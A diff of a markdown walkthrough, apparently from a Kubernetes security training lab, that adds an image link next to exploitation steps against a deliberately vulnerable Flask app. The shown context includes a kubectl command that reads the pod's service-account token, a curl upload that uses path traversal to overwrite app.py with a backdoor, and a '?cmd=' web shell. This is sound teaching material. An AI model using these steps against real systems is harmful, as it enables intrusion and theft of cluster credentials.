@@ -59,6 +59,7 @@ Application vulnerabilities can bring wide range of different *attack entrypoint
 > `kubectl --server=https://kubernetes.default.svc --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) <command>`
 
 > However, Kube API is not always exposed, so let's try to get kubectl working from the pod itself.
+
 ---
 
 11. upload the new Flask file to `../app.py` with the backdoor activated via GET parameter `cmd` (*vulnerability: [Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)* -- the attacker can upload file to an arbitrary directory):
@@ -79,6 +80,8 @@ Application vulnerabilities can bring wide range of different *attack entrypoint
     TOKEN=<your token>
     curl -vv -o /tmp/out.html -F "file=@payloads/app.py; filename=../app.py" "http://images.vulnerable-app.seck8s.slurm.io/?token=$TOKEN"
     ```
+    [![UFU upload shell](../static/03-application-security/09-file-upload.png)](https://www.youtube.com/watch?v=koTqZS-ThZ8&t=57m12s)
+
     - try again [http://images.vulnerable-app.seck8s.slurm.io/?cmd=ls](http://images.vulnerable-app.seck8s.slurm.io/?cmd=ls), get the backdoor shell
     - since the server is in Debug mode, it auto-reloads without restarting the pod
 
